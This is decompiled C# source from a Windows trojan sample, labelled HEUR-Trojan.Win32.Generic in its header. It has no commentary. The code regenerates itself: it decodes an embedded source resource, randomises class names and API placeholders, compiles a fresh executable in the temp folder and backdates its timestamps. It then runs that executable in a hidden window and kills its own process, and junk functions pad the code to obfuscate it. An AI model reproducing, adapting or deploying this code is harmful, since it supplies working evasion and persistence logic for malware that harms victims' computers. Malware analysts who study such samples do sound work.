// Decompiled with JetBrains decompiler
// Type: qFfABsLpVq
// Assembly: tmp4AD4.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 546DCBBF-3CD5-4241-AFD4-3CEDFD957653
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-70404169aa9d4a16f0b0bb0ffdd2c3cec0ba8a289bf12be0b6eaeacf9a5b8046.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;

[StandardModule]
public sealed class qFfABsLpVq
{
  public static void XhGIRGyxJR()
  {
    qFfABsLpVq.DelMe();
    string fileName = Process.GetCurrentProcess().MainModule.FileName;
    ResourceManager resourceManager = new ResourceManager("zCom", Assembly.GetExecutingAssembly());
    string Str = qFfABsLpVq.FromBase(Conversions.ToString(resourceManager.GetObject("src")));
    mDHrnWAXHl.Deflate_D((byte[]) resourceManager.GetObject("file"));
    using (ResourceWriter resourceWriter = new ResourceWriter("zCom.resources"))
    {
      resourceWriter.AddResource("src", qFfABsLpVq.ToBase(Str));
      resourceWriter.AddResource("file", RuntimeHelpers.GetObjectValue(resourceManager.GetObject("file")));
      resourceWriter.Generate();
      resourceWriter.Close();
    }
    string str1 = Path.GetTempFileName() + ".exe";
    string[] strArray = new string[9]
    {
      nameof (qFfABsLpVq),
      "dqBKpuTMbT",
      "mDHrnWAXHl",
      "OqxGObrdds",
      "jwXwUZLosg",
      "uYXFvyiEtp",
      "vIehrHjFDf",
      "CdNeRegomb",
      nameof (XhGIRGyxJR)
    };
    int num = checked (strArray.Length - 1);
    int index = 0;
    while (index <= num)
    {
      Str = Str.Replace(strArray[index], qFfABsLpVq.A(15));
      checked { ++index; }
    }
    Random random = new Random();
    int Kolikox = random.Next(1, 1);
    OqxGObrdds oqxGobrdds1 = new OqxGObrdds(1, Kolikox);
    VBMath.Randomize();
    string str2 = Str.Replace(Strings.StrReverse("1IPA'"), oqxGobrdds1.jwXwUZLosg());
    OqxGObrdds oqxGobrdds2 = new OqxGObrdds(1, Kolikox);
    VBMath.Randomize();
    string str3 = str2.Replace(Strings.StrReverse("2IPA'"), oqxGobrdds2.jwXwUZLosg());
    OqxGObrdds oqxGobrdds3 = new OqxGObrdds(1, Kolikox);
    VBMath.Randomize();
    string str4 = str3.Replace(Strings.StrReverse("3IPA'"), oqxGobrdds3.jwXwUZLosg());
    VBMath.Randomize();
    string Source = str4.Replace(Strings.StrReverse("#001#"), Conversions.ToString(Kolikox));
    dqBKpuTMbT.CdNeRegomb(str1, Source, true);
    qFfABsLpVq.DelMe();
    DateTime dateTime = new DateTime(checked (2000 + random.Next(7, 11)), random.Next(1, 10), random.Next(1, 30));
    File.SetCreationTime(str1, dateTime);
    File.SetLastAccessTime(str1, dateTime);
    File.SetLastWriteTime(str1, dateTime);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      FileName = str1,
      Arguments = fileName
    });
    Process.GetCurrentProcess().Kill();
  }

  public static string HmxpT00(string xsnPl0, string kyKlH0, string whBgq0)
  {
    string[] strArray1 = new string[5]
    {
      "HmxpT0",
      nameof (xsnPl0),
      nameof (kyKlH0),
      nameof (whBgq0),
      "tYlja0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], xsnPl0, false) != 0)
    {
      kyKlH0 = whBgq0 + xsnPl0;
      if (whBgq0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (whBgq0.Length - 1));
        while (kyKlH0.Length == 2)
        {
          if (xsnPl0.Contains(strArray1[1]))
            return xsnPl0;
        }
      }
    }
    return xsnPl0;
  }

  public static string VZtiv11(string LZedi1, string SqzFu1, string wJcYU1)
  {
    string[] strArray1 = new string[5]
    {
      "VZtiv1",
      nameof (LZedi1),
      nameof (SqzFu1),
      nameof (wJcYU1),
      "TPzdz1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], LZedi1, false) != 0)
    {
      SqzFu1 = wJcYU1 + LZedi1;
      if (wJcYU1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (wJcYU1.Length - 1));
        while (SqzFu1.Length == 2)
        {
          if (LZedi1.Contains(strArray1[1]))
            return LZedi1;
        }
      }
    }
    return LZedi1;
  }

  public static string A(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public static string AB(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "1234567890".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public static string ToBase(string Str) => Convert.ToBase64String(Encoding.Default.GetBytes(Str));

  public static string FromBase(string Str) => Encoding.Default.GetString(Convert.FromBase64String(Str));

  public static void DelMe()
  {
    try
    {
      File.Delete("zCom.resources");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
